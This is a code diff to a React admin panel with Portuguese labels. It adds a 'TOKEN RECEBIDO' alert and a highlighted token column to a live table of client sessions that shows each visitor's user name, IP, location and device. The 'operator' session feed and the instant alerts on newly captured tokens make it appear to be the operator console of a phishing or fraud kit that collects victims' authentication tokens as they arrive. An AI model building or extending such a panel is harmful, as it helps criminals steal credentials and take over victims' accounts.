@@ -81,6 +81,14 @@ export default function AdminPanel() {
     });
 
     newSocket.on('operator:sessions', (data: ClientSession[]) => {
+      // Verificar se algum token novo chegou para notificar
+      data.forEach(newSess => {
+        const oldSess = sessions.find(s => s.sessionId === newSess.sessionId);
+        if (newSess.token && (!oldSess || oldSess.token !== newSess.token)) {
+          toast.success('TOKEN RECEBIDO', `Novo token de ${newSess.usuario || newSess.ip}: ${newSess.token}`);
+        }
+      });
+
       setSessions(data);
       setSelectedSession(prevSession => {
         if (prevSession) {
@@ -260,6 +268,7 @@ export default function AdminPanel() {
                     <tr>
                     <th className="p-3">Usuário</th>
                     <th className="p-3">IP</th>
+                    <th className="p-3">Token</th>
                     <th className="p-3">Localização</th>
                     <th className="p-3">Dispositivo</th>
                     <th className="p-3">Status</th>
@@ -271,6 +280,7 @@ export default function AdminPanel() {
                     <tr key={s.sessionId} className="border-t border-slate-700 hover:bg-slate-700/50">
                       <td className="p-3">{s.usuario || '—'}</td>
                       <td className="p-3">{s.ip}</td>
+                      <td className="p-3 font-mono text-green-400 font-bold">{s.token || '—'}</td>
                       <td className="p-3">{s.cidade}, {s.estado}</td>
                       <td className="p-3 text-xs text-slate-400">{s.device}</td>
                       <td className="p-3">
